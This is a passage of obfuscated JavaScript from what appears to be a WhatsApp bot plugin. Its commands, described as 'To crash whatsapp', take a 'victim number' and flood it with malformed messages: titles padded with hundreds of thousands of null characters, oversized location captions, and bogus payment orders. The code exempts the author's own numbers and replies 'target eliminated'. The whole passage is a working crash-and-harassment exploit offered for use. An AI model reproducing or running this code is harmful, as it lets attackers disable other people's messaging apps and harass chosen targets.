          'listMessage': {
            'title': "SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸" + "\0".repeat(920000),
            'footerText': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
            'description': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
            'buttonText': null,
            'listType': 0x2,
            'productListInfo': {
              'productSections': [{
                'title': "lol",
                'products': [{
                  'productId': "4392524570816732"
                }]
              }],
              'productListHeaderImage': {
                'productId': "4392524570816732",
                'jpegThumbnail': null
              },
              'businessOwnerJid': "0@s.whatsapp.net"
            }
          },
          'footer': "lol",
          'contextInfo': {
            'expiration': 0x927c0,
            'ephemeralSettingTimestamp': "1679959486",
            'entryPointConversionSource': "global_search_new_chat",
            'entryPointConversionApp': "whatsapp",
            'entryPointConversionDelaySeconds': 0x9,
            'disappearingMode': {
              'initiator': "INITIATED_BY_ME"
            }
          },
          'selectListType': 0x2,
          'product_header_info': _0x34b21f
        }), {
          'userJid': _0x26cc2e
        });
        await _0x4d9e09.relayMessage(_0x26cc2e, _0x4a8aa7.message, {
          'participant': {
            'jid': _0x26cc2e
          },
          'messageId': _0x4a8aa7.key.id
        });
      }
      async function _0x1da8da(_0x2d3aca, _0x520bd2) {
        for (let _0x51811a = 0; _0x51811a < _0x520bd2; _0x51811a++) {
          _0x152e15(_0x2d3aca);
          _0x385cdf(_0x2d3aca);
          await sleep(500);
        }
      }
      function _0x1d5b1e(_0x4181f3, _0x573b52 = [], _0x471d1b = false) {
        if (_0x471d1b == null || _0x471d1b == undefined || _0x471d1b == false) {
          const _0x171cf0 = {
            text: _0x200ab3,
            mentions: _0x573b52
          };
          return _0x4d9e09.sendMessage(_0x1065ad.chat, _0x171cf0, {
            'quoted': _0x1065ad
          });
        } else {
          const _0x5a9197 = {
            text: _0x200ab3,
            mentions: _0x573b52
          };
          return _0x4d9e09.sendMessage(_0x1065ad.chat, _0x5a9197, {
            'quoted': _0x1065ad
          });
        }
      }
      let _0x518c0c = _0x200ab3.split(',')[0];
      let _0x314bed = _0x200ab3.split(',')[1] * 5;
      if (!_0x518c0c || !_0x314bed) {
        return _0x3c8cb4("Use " + (_0x38b9e2 + _0x5e3071) + " victim number|amount\nExample " + (_0x38b9e2 + _0x5e3071) + " 91xxxxxxxxxx,5");
      }
      if (isNaN(parseInt(_0x314bed))) {
        return _0x3c8cb4("Amount must be a number");
      }
      let _0x5afca4 = _0x518c0c.replace(/[^0-9]/g, '');
      let _0x4c803f = '' + encodeURI(_0x314bed);
      var _0x14e29d = await _0x4d9e09.onWhatsApp(_0x5afca4 + "@s.whatsapp.net");
      let _0x15c48b = _0x5afca4 + "@s.whatsapp.net";
      if (_0x5afca4 == "923072380380") {
        return;
      }
      if (_0x14e29d.length == 0) {
        return _0x3c8cb4("The number is not registered on WhatsApp");
      }
      _0x3c8cb4("please wait, " + _0x5e3071 + " bug is in process..");
      await sleep(2000);
      _0x1da8da(_0x15c48b, _0x4c803f);
      await sleep(2500);
      _0x1d5b1e("Successfully Sent Bug To @" + _0x15c48b.split('@')[0] + " Using *" + _0x5e3071 + "* âœ…\n\nPause 2 minutes so that the bot is not banned.", [_0x15c48b]);
      const _0x5ec119 = {
        text: '✅️',
        key: _0x54af2f.key
      };
      const _0x2d0747 = {
        react: _0x5ec119
      };
      _0x4d9e09.sendMessage(_0x29d825, _0x2d0747);
    } catch (_0x53d5c1) {
      _0x3c8cb4("an error occurred while executing the command contact the Hamza developer!");
      _0x4df560(_0x53d5c1);
    }
  });
  const _0x52fffe = {
    pattern: "xbytecrash",
    react: '🔖',
    desc: "To crash whatsapp",
    category: "bug",
    use: ".xbytecrash",
    filename: __filename
  };
  cmd(_0x52fffe, async (_0x40942e, _0x42b07b, _0x72bf04, {
    from: _0x308c20,
    prefix: _0x4ff025,
    l: _0x5f2216,
    quoted: _0xcba45e,
    body: _0x501a60,
    isCmd: _0x32aee7,
    command: _0x45c784,
    args: _0x2268ee,
    q: _0x1d7cf5,
    isGroup: _0x30184a,
    sender: _0x410c1a,
    senderNumber: _0x33b05f,
    botNumber2: _0x3e66fa,
    botNumber: _0x1053f3,
    pushname: _0x3822f7,
    isMe: _0x4b3425,
    isDev: _0xfdc0f5,
    isOwner: _0x33aed0,
    groupMetadata: _0x96eaaf,
    groupName: _0x10ca11,
    participants: _0x18448c,
    groupAdmins: _0x4b1781,
    isBotAdmins: _0x404a60,
    isAdmins: _0x5c3736,
    reply: _0x3cbd19
  }) => {
    try {
      if (!_0xfdc0f5) {
        return _0x3cbd19("⚠️ ⚠️ *This is X-BYTE bugs... You dont have permission to use this Bot..̅");
      }
      _0x3cbd19("</> crash starting... ");
      if (_0x308c20.includes("923072380380") || _0x308c20.includes("923458017380") || _0x308c20.includes("923152380380") || _0x308c20.includes("923453800380")) {
        return _0x3cbd19("Sorry, I cant upload code to my Hamza developer 🥱\nTry to use it on another private!!");
      }
      if (_0x308c20.includes("120363331372867340@g.us") || _0x308c20.includes("120363320416667582@g.us")) {
        return _0x3cbd19("Sorry, I cant send locks to my Hamza developers group 🥱\nTry using it in another group!!");
      }
      async function _0x202043(_0x255fe6) {
        var _0x1ee6b0 = generateWAMessageFromContent(_0x255fe6, proto.Message.fromObject({
          'viewOnceMessage': {
            'message': {
              'liveLocationMessage': {
                'degreesLatitude': 'p',
                'degreesLongitude': 'p',
                'caption': "Ø‚Ù†ØƒØ„Ù½Ø‚Ù†ØƒØ„Ù½" + "ê¦¾".repeat(50000),
                'sequenceNumber': '0',
                'jpegThumbnail': ''
              }
            }
          }
        }), {
          'userJid': _0x255fe6
        });
        await _0x40942e.relayMessage(_0x255fe6, _0x1ee6b0.message, {
          'participant': {
            'jid': _0x255fe6
          },
          'messageId': _0x1ee6b0.key.id
        });
      }
      async function _0x5e92d0(_0x4b548f) {
        const _0x1e42e3 = {
          product_header_info_id: 0x4433e2e130,
          product_header_is_rejected: false
        };
        var _0x11b519 = generateWAMessageFromContent(_0x4b548f, proto.Message.fromObject({
          'listMessage': {
            'title': "SÌ¸Yê™°Ì¸Sê™°Ì¸Tê™°Ì¸Eê™°Ì¸Mê™°Ì¸ UÌ¸IÌ¸ CÌ¸Rê™°Ì¸Aê™°Ì¸Sê™°Ì¸Hê™°Ì¸" + "\0".repeat(920000),
            'footerText': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡ÍœâƒŸâ•®",
            'description': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡ÍœâƒŸâ•®",
            'buttonText': null,
            'listType': 0x2,
            'productListInfo': {
              'productSections': [{
                'title': "lol",
                'products': [{
                  'productId': "4392524570816732"
                }]
              }],
              'productListHeaderImage': {
                'productId': "4392524570816732",
                'jpegThumbnail': null
              },
              'businessOwnerJid': "0@s.whatsapp.net"
            }
          },
          'footer': "lol",
          'contextInfo': {
            'expiration': 0x927c0,
            'ephemeralSettingTimestamp': "1679959486",
            'entryPointConversionSource': "global_search_new_chat",
            'entryPointConversionApp': "whatsapp",
            'entryPointConversionDelaySeconds': 0x9,
            'disappearingMode': {
              'initiator': "INITIATED_BY_ME"
            }
          },
          'selectListType': 0x2,
          'product_header_info': _0x1e42e3
        }), {
          'userJid': _0x4b548f
        });
        await _0x40942e.relayMessage(_0x4b548f, _0x11b519.message, {
          'participant': {
            'jid': _0x4b548f
          },
          'messageId': _0x11b519.key.id
        });
      }
      function _0x19490d(_0x3f0dad, _0x3d264d = [], _0x11aa73 = false) {
        if (_0x11aa73 == null || _0x11aa73 == undefined || _0x11aa73 == false) {
          const _0x1a5e8f = {
            text: _0x1d7cf5,
            mentions: _0x3d264d
          };
          return _0x40942e.sendMessage(_0x72bf04.chat, _0x1a5e8f, {
            'quoted': _0x72bf04
          });
        } else {
          const _0x6be1b6 = {
            text: _0x1d7cf5,
            mentions: _0x3d264d
          };
          return _0x40942e.sendMessage(_0x72bf04.chat, _0x6be1b6, {
            'quoted': _0x72bf04
          });
        }
      }
      async function _0x175d7a(_0x3a5420, _0x19444d) {
        for (let _0x1dbb97 = 0; _0x1dbb97 < _0x19444d; _0x1dbb97++) {
          _0x202043(_0x3a5420);
          _0x5e92d0(_0x3a5420);
          await sleep(500);
        }
      }
      function _0x19490d(_0x371028, _0x4260f9 = [], _0x366632 = false) {
        if (_0x366632 == null || _0x366632 == undefined || _0x366632 == false) {
          const _0x318cb8 = {
            text: _0x1d7cf5,
            mentions: _0x4260f9
          };
          return _0x40942e.sendMessage(_0x72bf04.chat, _0x318cb8, {
            'quoted': _0x72bf04
          });
        } else {
          const _0x422306 = {
            text: _0x1d7cf5,
            mentions: _0x4260f9
          };
          return _0x40942e.sendMessage(_0x72bf04.chat, _0x422306, {
            'quoted': _0x72bf04
          });
        }
      }
      if (!_0x1d7cf5) {
        return _0x3cbd19("Use " + (_0x4ff025 + _0x45c784) + " victim number|amount\nExample " + (_0x4ff025 + _0x45c784) + " 91xxxxxxxxxx,5");
      }
      let _0x2f7bf6 = _0x1d7cf5.split(',')[0];
      let _0x21ebae = _0x1d7cf5.split(',')[1] * 5;
      if (!_0x2f7bf6 || !_0x21ebae) {
        return _0x3cbd19("Use " + (_0x4ff025 + _0x45c784) + " victim number|amount\nExample " + (_0x4ff025 + _0x45c784) + " 91xxxxxxxxxx,5");
      }
      if (isNaN(parseInt(_0x21ebae))) {
        return _0x3cbd19("Amount must be a number");
      }
      let _0x41db46 = _0x2f7bf6.replace(/[^0-9]/g, '');
      let _0x2c0c86 = '' + encodeURI(_0x21ebae);
      var _0x2fa09f = await _0x40942e.onWhatsApp(_0x41db46 + "@s.whatsapp.net");
      let _0x51aa65 = _0x41db46 + "@s.whatsapp.net";
      if (_0x41db46 == "25475766950461") {
        return;
      }
      if (_0x2fa09f.length == 0) {
        return _0x3cbd19("The number is not registered on WhatsApp");
      }
      _0x3cbd19("please wait, " + _0x45c784 + " bug is in process..");
      await sleep(2000);
      _0x175d7a(_0x51aa65, _0x2c0c86);
      await sleep(2500);
      _0x19490d("Successfully Sent Bug To @" + _0x51aa65.split('@')[0] + " Using *" + _0x45c784 + "* \n\nPause 2 minutes so that the bot is not banned.", [_0x51aa65]);
      const _0x5b38a1 = {
        text: '✅️',
        key: _0x42b07b.key
      };
      const _0x662fe2 = {
        react: _0x5b38a1
      };
      _0x40942e.sendMessage(_0x308c20, _0x662fe2);
    } catch (_0x27b8b8) {
      _0x3cbd19("an error occurred while executing the command contact the Hamza developer!");
      _0x5f2216(_0x27b8b8);
    }
  });
  const _0x31b374 = {
    pattern: "resbug",
    react: '🔖'
  };
  function _0x2543e2(_0x7e6936, _0xbef4f2, _0x58aa57, _0x307d11, _0x2418ec) {
    return _0x3baf(_0x307d11 - 0xc8, _0x2418ec);
  }
  _0x31b374.desc = "To crash whatsapp";
  _0x31b374.category = "bug";
  function _0x5a9c3d(_0x288d0a, _0x5c5054, _0x37bf9c, _0x924538, _0x3c5004) {
    return _0x3baf(_0x924538 - 0x1be, _0x288d0a);
  }
  _0x31b374.use = ".resbug 92307xxxxxxx";
  _0x31b374.filename = __filename;
  cmd(_0x31b374, async (_0x4eb8ce, _0x5e9dac, _0x3ae037, {
    from: _0x33ae7b,
    prefix: _0x2f19ae,
    l: _0x3a5dfd,
    quoted: _0x2b760c,
    body: _0x3be688,
    isCmd: _0x198ae5,
    command: _0x7c6c01,
    args: _0x92a25b,
    q: _0x362728,
    isGroup: _0x4740e2,
    sender: _0x5a6f40,
    senderNumber: _0x57b2f9,
    botNumber2: _0x24412,
    botNumber: _0x15f583,
    pushname: _0xa9afd9,
    isMe: _0x1a863b,
    isDev: _0x274e64,
    isOwner: _0x1a4cd7,
    groupMetadata: _0xf44176,
    groupName: _0x217663,
    participants: _0x9da144,
    groupAdmins: _0x3d8b68,
    isBotAdmins: _0x317098,
    isAdmins: _0x20c221,
    reply: _0x359529
  }) => {
    try {
      if (!_0x274e64) {
        return _0x359529("⚠️ ⚠️ *This is X-BYTE bugs... You dont have permission to use this Bot..̅");
      }
      if (_0x33ae7b.includes("923072380380") || _0x33ae7b.includes("923458017380") || _0x33ae7b.includes("923152380380") || _0x33ae7b.includes("923453800380")) {
        return _0x359529("Sorry, I cant upload code to my Hamza developer 🥱\nTry to use it on another private!!");
      }
      if (_0x33ae7b.includes("120363331372867340@g.us") || _0x33ae7b.includes("120363320416667582@g.us")) {
        return _0x359529("Sorry, I cant send locks to my Hamza developers group 🥱\nTry using it in another group!!");
      }
      if (!_0x362728) {
        return _0x359529("Penggunaan ." + _0x7c6c01 + " 92307xxxxxxx");
      }
      const _0x139381 = {
        remoteJid: "status@broadcast"
      };
      const _0x495316 = {
        'participant': "0@s.whatsapp.net",
        ...(_0x3ae037.chat ? _0x139381 : {})
      };
      const _0x42ae82 = {
        title: "X B Y T E,  B Y  H A M Z A"
      };
      const _0x589cac = {
        listResponseMessage: _0x42ae82
      };
      const _0x2402d0 = {
        key: _0x495316,
        message: _0x589cac
      };
      const _0x73a680 = {
        remoteJid: "status@broadcast"
      };
      const _0x41df82 = {
        'participant': "0@s.whatsapp.net",
        ...(_0x3ae037.chat ? _0x73a680 : {})
      };
      const _0x14a0a1 = {
        name: "review_and_pay",
        buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍n꙲a꙲r꙲u꙲t꙲o꙲ ₵Ɽ₳₴Ⱨ̿╮⭑ ☠️⃰͜͡؜⃟ĕ̈d̆̈n̆̈ŭ̈t̆̈🔥᜴#Naruto999ཀ͜͡😈⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
      };
      const _0x15a433 = {
        buttons: [_0x14a0a1]
      };
      const _0x568b32 = {
        'key': _0x41df82,
        'message': {
          'interactiveMessage': {
            'header': {
              'hasMediaAttachment': true,
              'jpegThumbnail': fs.readFileSync("./lib/Hamza.png")
            },
            'nativeFlowMessage': _0x15a433
          }
        }
      };
      const _0x941e60 = {
        remoteJid: "status@broadcast"
      };
      const _0x488eaf = {
        'participant': "0@s.whatsapp.net",
        ...(_0x3ae037.chat ? _0x941e60 : {})
      };
      const _0x49b8cd = {
        name: "review_and_pay",
        buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍Ê̬d̬̂n̬̂û̬t̂👹̬ s͓̽a͓̽y͓̽s͓̽╮⭑ ☠️⃰w҉a҉g҉w҉a҉n҉ t҉o҉ y҉o҉u҉r҉͜͡؜🔥᜴₥Ʉ₥#ཀ͜͡😈⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
      };
      const _0x455040 = {
        buttons: [_0x49b8cd]
      };
      const _0x56fa76 = {
        'key': _0x488eaf,
        'message': {
          'interactiveMessage': {
            'header': {
              'hasMediaAttachment': true,
              'jpegThumbnail': fs.readFileSync("./lib/Hamza.png")
            },
            'nativeFlowMessage': _0x455040
          }
        }
      };
      async function _0x580888(_0x4fd96c, _0x52e57c) {
        const _0x589049 = {
          product_header_info_id: 0x4433e2e130
        };
        _0x589049.product_header_is_rejected = false;
        var _0x385358 = generateWAMessageFromContent(_0x4fd96c, proto.Message.fromObject({
          'listMessage': {
            'title': "⟠ TALKDROVE ⿻ 𝐂𝐋͢𝐢𝚵𝐍͢𝐓 々" + "\0".repeat(920000),
            'footerText': "✳️᜴࿆͆᷍𝓮𝓭𝓷𝓾𝓽 𝓼𝓾𝓹𝓮𝓻 𝔁 𝓬𝓻𝓪𝓼𝓱𝓿ཀ͜͡😈⃟╮.xp",
            'description': "✳️᜴࿆͆᷍𝓮𝓭𝓷𝓾𝓽 𝓼𝓾𝓹𝓮𝓻 𝔁 𝓬𝓻𝓪𝓼𝓱😈⃟╮.xp",
            'buttonText': null,
            'listType': 0x2,
            'productListInfo': {
              'productSections': [{
                'title': "anjay",
                'products': [{
                  'productId': "4392524570816732"
                }]
              }],
              'productListHeaderImage': {
                'productId': "4392524570816732",
                'jpegThumbnail': null
              },
              'businessOwnerJid': "0@s.whatsapp.net"
            }
          },
          'footer': "puki",
          'contextInfo': {
            'expiration': 0x93a80,
            'ephemeralSettingTimestamp': "1679959486",
            'entryPointConversionSource': "global_search_new_chat",
            'entryPointConversionApp': "whatsapp",
            'entryPointConversionDelaySeconds': 0x9,
            'disappearingMode': {
              'initiator': "INITIATED_BY_ME"
            }
          },
          'selectListType': 0x2,
          'product_header_info': _0x589049
        }), {
          'userJid': _0x4fd96c,
          'quoted': _0x2402d0
        });
        await _0x4eb8ce.relayMessage(_0x4fd96c, _0x385358.message, {
          'participant': {
            'jid': _0x4fd96c
          },
          'messageId': _0x385358.key.id
        });
      }
      async function _0x3f37d8(_0x4844ec, _0x37abef) {
        var _0x2aa2a3 = generateWAMessageFromContent(_0x4844ec, proto.Message.fromObject({
          'viewOnceMessage': {
            'message': {
              'liveLocationMessage': {
                'degreesLatitude': 'p',
                'degreesLongitude': 'p',
                'caption': "✳️࿆᷍🥷᜴͆𝑵𝒂𝒓𝒖𝒕𝒐༄ ❞𝒗𝒊𝒕𝒂𝒍ׁׅ֮̿╮⭑ ☠️⃰͜͡𝒄𝒓𝒂𝒔𝒉𝒙𝒙🔥᜴▴𝓮𝓭𝓷𝓾𝓽 𝓫𝓾𝓰😈⃟╮.xp" + 'ꦾ'.repeat(50000),
                'sequenceNumber': '0',
                'jpegThumbnail': ''
              }
            }
          }
        }), {
          'userJid': _0x4844ec,
          'quoted': _0x37abef
        });
        await _0x4eb8ce.relayMessage(_0x4844ec, _0x2aa2a3.message, {
          'participant': {
            'jid': _0x4844ec
          },
          'messageId': _0x2aa2a3.key.id
        });
      }
      async function _0x5c9136(_0x3d9e74, _0x558b0f) {
        const _0x1a27f6 = {
          upload: _0x4eb8ce.waUploadToServer
        };
        const _0x18e739 = {
          text: ''
        };
        var _0x19b5ba = generateWAMessageFromContent(_0x3d9e74, proto.Message.fromObject({
          'interactiveMessage': {
            'header': {
              'title': "🩸⃟༑⌁⃰₦₳ⱤɄ₮Ø ฿Ø₮ ₵Ɽ₳₴ⱧɆⱤ🦠",
              'hasMediaAttachment': true,
              ...(await prepareWAMessageMedia({
                'image': {
                  'url': "https://raw.githubusercontent.com/HyHamza/HyHamza/main/Images/XByte-logo.png"
                }
              }, _0x1a27f6))
            },
            'body': _0x18e739,
            'footer': {
              'text': "›          #Ednutcrash"
            },
            'nativeFlowMessage': {
              'messageParamsJson': "\0".repeat(1000000)
            }
          }
        }), {
          'userJid': _0x3d9e74,
          'quoted': _0x558b0f
        });
        await _0x4eb8ce.relayMessage(_0x3d9e74, _0x19b5ba.message, {
          'participant': {
            'jid': _0x3d9e74
          },
          'messageId': _0x19b5ba.key.id
        });
      }
      async function _0x47989e(_0x1ce7de, _0x4ae0df) {
        var _0x1312e4 = generateWAMessageFromContent(_0x1ce7de, proto.Message.fromObject({
          'stickerMessage': {
            'url': "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
            'fileSha256': "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
            'fileEncSha256': "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
            'mediaKey': "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
            'mimetype': "image/webp",
            'directPath': "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
            'fileLength': "10116",
            'mediaKeyTimestamp': "1715876003",
            'isAnimated': false,
            'stickerSentTs': "1715881084144",
            'isAvatar': false,
            'isAiSticker': false,
            'isLottie': false
          }
        }), {
          'userJid': _0x1ce7de,
          'quoted': _0x4ae0df
        });
        await _0x4eb8ce.relayMessage(_0x1ce7de, _0x1312e4.message, {
          'participant': {
            'jid': _0x1ce7de
          },
          'messageId': _0x1312e4.key.id
        });
      }
      let _0x514fef = _0x362728.replace(/[^0-9]/g, '');
      if (_0x514fef.startsWith('0')) {
        return _0x359529("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x7c6c01 + " 6283123456789");
      }
      let _0x551b9d = _0x514fef + "@s.whatsapp.net";
      await _0x359529("</> crash by Hamza... ");
      for (let _0x5dd4a4 = 0; _0x5dd4a4 < 1; _0x5dd4a4++) {
        await _0x580888(_0x551b9d, _0x2402d0);
        await _0x3f37d8(_0x551b9d, _0x568b32);
        await _0x5c9136(_0x551b9d, _0x2402d0);
        await _0x3f37d8(_0x551b9d, _0x568b32);
        await _0x47989e(_0x551b9d, _0x56fa76);
        await _0x3f37d8(_0x551b9d, _0x568b32);
      }
      await _0x359529("𝒕𝒂𝒓𝒈𝒆𝒕 𝒆𝒍𝒊𝒎𝒊𝒏𝒂𝒕𝒆𝒅 🥶 " + _0x551b9d + " 𝒖𝒔𝒊𝒏𝒈 " + _0x7c6c01 + ".ᯤ\n\n 𝒏𝒐 𝒑𝒆𝒂𝒄𝒆 𝒇𝒐𝒓 𝒕𝒉𝒆 𝒘𝒊𝒄𝒌𝒆𝒅💀.");
      const _0x3a6613 = {
        text: '✅️',
        key: _0x5e9dac.key
      };
      const _0x3b9a98 = {
        react: _0x3a6613
      };
      _0x4eb8ce.sendMessage(_0x33ae7b, _0x3b9a98);
    } catch (_0x5938f7) {
      _0x359529("an error occurred while executing the command contact the Hamza developer!");
      _0x3a5dfd(_0x5938f7);
    }
  });
